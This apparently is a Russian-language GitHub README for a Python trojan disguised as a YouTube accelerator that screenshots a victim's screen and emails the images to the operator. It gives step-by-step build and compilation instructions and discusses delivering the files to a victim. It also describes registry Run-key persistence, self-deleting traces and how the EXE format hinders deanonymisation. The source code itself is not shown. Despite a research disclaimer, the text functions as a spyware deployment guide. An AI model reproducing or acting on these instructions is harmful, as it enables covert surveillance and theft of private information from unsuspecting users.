<h1>YouTubeTV</h1>

<img src="https://github.com/emelyagr/YouTubeTV/blob/main/LogoYouTubeTV.png" class="center" width="350" height="350"> 
YouTubeTV — программа, замаскированная под ускоритель YouTube, для автоматического создания снимков экрана и их отправки на Вашу электронную почту.

<h2>Использование</h2>

Программа создана исключительно в исследовательских целях кибербезопасности, а также для тестирования антивирусных программ. Автор не несёт ответственность за использование программ другими людьми, и (или) в каких-либо злоумышленных целях. Использование, создание и (или) распространение любого программного обеспечения в злоумышленных целях определяет "УК РФ Статья 273. Создание, использование и распространение вредоносных компьютерных программ". Данное ПО не призвано обманывать людей и наживаться на их доверии, оно лишь показывает, что людям стоит осторожнее относиться к скачиванию и использованию средств для обхода блокировок, узнавать репутацию и пользоваться антивирусами для проверки (как своим, так и например "Virus Total", к сожалению показывающий, что это абсолютно не злоумышленный файл, но тут его можно понять). Недобросовестные корпорации, спецслужбы, и прочие недоброжелатели могут распространять средства обхода блокировок для получения доступа к компьютерам, информации и прочему, используя принцип легендирования: "Я - свой, доверяйте мне". Стоит отметить, что некоторые данные средства могут действительно помогать с обходом блокировок, и не быть злоумышленными по отношению к пользователям, или же помогать, но и собирать с Вас информацию.

Пример использования: https://youtu.be/LvG0S5V2dYA

1. Скачайте из релиза (Releases: https://github.com/emelyagr/YouTubeTV/releases/tag/v1.0.0) файлы "default.env", "YouTubeTV.py" и "LogoYouTubeTV.png". Исполняемого файла нет, т. к. он не подойдёт для Вашего пользования. Далее описана инструкция для создания исполняемого файла для Вас.
2. В настройках учётной записи своей электронной почты, для получения снимков, установите разрешение на использование Внешними сервисами доступа к Почте по IMAP, POP, SMTP. Обычно данные настройки находятся в разделе Безопасности или подобных. Скорее всего сервис выдаст Вам пароль для Внешних подключений, но возможно и нет, в таком случае дальше понадобится пароль от самой учётной записи. Это необходимо проделать для того, чтобы снимок экрана дошёл до Вас с помощью автоматической авторизации на компьютере, которая выполнится кодом программы, взяв учётные данные пользователя из файла окружения "default.env".
3. Запустите "YouTubeTV.py" в любой удобной для Вас среде разработки, можно даже в Блокноте. В участке кода "Основная функция" запишите Ваш ненужный (по возможности анонимный, без имён и фамилий) адрес электронной почты. В учатске кода "Функция для отправки письма с вложением" в строке "with smtplib.SMTP_SSL('smtp.mail.ru', 465) as smtp:" запишите SMTP-сервер сервиса Вашего почтового ящика (его можно легко узнать в Интернете). Сохраните файл.
4. Запустите файл "default.env" в Блокноте и запишите Ваши учётные данные (логин и пароль) от Вашей электронной почты, указанной в пункте 2 (в основном коде программы). Переименуйте файл в "*.env". Сохраните файл. 
5. Установите (если ранее этого не делали) "Python" отсюда: https://www.python.org/downloads/windows/.
6. Затем файлы "*.env" и "YouTubeTV.py" лучше поместить в корневую папку установленного "Python", как правило это "C:\Users\\*Имя пользователя системы*\AppData\Local\Programs\Python\Python312".
7. Запустите командную строку "Windows" ("cmd") и введите команду для установки библиотеки создания (компиляции) программ "pip install pyinstaller" (все команды вводятся без кавычек!).
8. В командной строке "Windows" ("cmd") перейдите в директорию (папку) только что сохранённых файлов (проекта) командой "cd C:\Users\\*Имя пользователя системы*\AppData\Local\Programs\Python\Python312".
9. Перенесите файл "LogoYouTubeTV.png" на Рабочий стол. В командной строке "Windows" ("cmd"), находясь в указанной ранее директории (папке), пропишите команду для создания программы: "pyinstaller -F -i "C:\Users\\*Имя пользователя системы*\Desktop\LogoYouTubeTV.png" YouTubeTV.py" (здесь путь до изображения прописывается в кавычках!). Если вдруг не создалась иконка, то переведите её в формат ".ico" здесь: https://convertio.co/ru/png-ico/ и попробуйте скомпилировать заново.
10. Дождитесь длительного процесса создания файла. После "70706 INFO: Building EXE from EXE-00.toc completed successfully." программу формата ".exe" можно будет найти в "C:\Users\\*Имя пользователя системы*\AppData\Local\Programs\Python\Python312\dist".
11. Поместите файлы "*.env" и "YouTubeTV.exe" в одну директорию (папку), например на Рабочий стол. В противном случае, программа работать не будет, предупредив уведомлением об ошибке.
12. Запустите "YouTubeTV.exe" и дождитесь длительной загрузки программы. В случае слов "YouTube ускорен!" снимок Вашего экрана будет создан, сохранён в этой же директории и отправлен на Вашу электронную почту в виде письма самому себе. Не забудьте о том, что Вы обязательно должны быть подключены к Интернету. Через некоторое время снимок экрана с данной директории самоуничтожится, для удаления следов компрометации и сохранения памяти для устройства. В случае ошибок пересмотрите пункты, начиная со 2, проверьте, верно ли введены данные в файле "YouTubeTV.py" (SMTP-сервер сервиса и Ваш адрес почты) и в "*.env" (данные авторизации).
13. Таким образом, созданные файлы могут быть доставлены к атакуемой жертве, например, в корень диска, что делать категорически запрещено согласно "УК РФ Статья 273. Создание, использование и распространение вредоносных компьютерных программ": https://www.consultant.ru/document/cons_doc_LAW_10699/a4d58c1af8677d94b4fc8987c71b131f10476a76/.

<h2>Преимущества, недостатки и особенности</h2>

Преимущества программы:
1. Работоспособность.
2. Минимальное заимствование сторонних библиотек.
3. Наличие логов в замаскированном виде ("YouTube ускорен" или "Ошибка ...").
4. Маскировка программы под ускоритель YouTube, что актуально в условиях его блокировки.
5. Весь проект содержится в двух файлах форматов "*.exe" и "*.env", что позволяет легко его запускать и распространять.
6. Учётные данные записаны в отдельном файле "*.env", чтобы данные авторизации не находились в основном коде программы.
7. Простота в использовании программы.
8. Простота, стиль и читабельность кода.

Недостатки программы:
1. Очень длительная загрузка программы и возможные зависания компьютера. Python - один из самых "медленных" языков программирования, особенно что касается исполняемых программ, поэтому отдельные программы зачастую пишут на низкоуровневых ЯП по типу С/С++, Rust, Ассемблер и др., однако вредоносные скрипты бывают и на python. Для быстрого использования запускайте программу в виде файла формата "*.py", однако учтите, что в файле исполняемого формата "*.exe" сложнее деанонимизировать вашу электронную почту (получателя) и сложнее выявить вредоносные намерения путём декомпиляции (дизассемблирования) программы. К тому же, файл формата "*.py" запустится только там, где установлен Python, а файл формата "*.exe" запустится на любом устройстве с ОС "Windows".
2. Отсутствие маскировки и запутывания (обфускации) вредоносного кода.
3. Программа не работает в скрытом режиме, а только при запуске. При этом можно сделать запуск программы автоматическим, при запуске ОС: для этого необходимо указать путь к файлу программы (например, C:\Users\Grisha\Desktop\YouTubeTV.exe) в "Редактор реестра Windows" в раздел "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", создав там новое значение, например типа "REG_SZ". В других ОС это можно реализовать и по-другому.
4. Помимо доставки исполняемого файла также необходима доставка файла окружения "*.env", чтобы снимок экрана дошёл до Вас, что потребует дополнительных условностей перед атакуемой жертвой.
5. В файле "*.env" должны находиться Ваши учётные данные, поэтому необходимо использование ненужной (по возможности анонимной, без имён и фамилий) электронной почты.
6. Увидев содержимое файла "*.env" жертва может произвести злоумышленные действия по отношению к Вашему почтовому ящику, особенно если в графе пароля введён обычный пароль учётной записи, а не пароль Внешних подключений.
7. Минимальная функциональность.

Отчёт о проверке программы на "Virus Total": https://www.virustotal.com/gui/file/179ac2602fa0b5c39d58639e1219db589223235013533fcaa9e2cd5186a8d826

(С) Емельянов Григорий Андреевич. Все права защищены. Использование (копирование, сбор, обработка, хранение, распространение, предоставление и другие действия, и иное воспроизведение в какой бы то ни было форме) любых материалов, статей, книг, курсов, программных кодов, программ и всех содержащихся материалов (и информации) без полного указания автора и источников и/или разрешения автора запрещено. Все работы защищены ЦВЗ (цифровым водяным знаком).

<h2>Star History</h2>

[![Star History Chart](https://api.star-history.com/svg?repos=emelyagr/YouTubeTV&type=Date)](https://star-history.com/#emelyagr/YouTubeTV&Date)
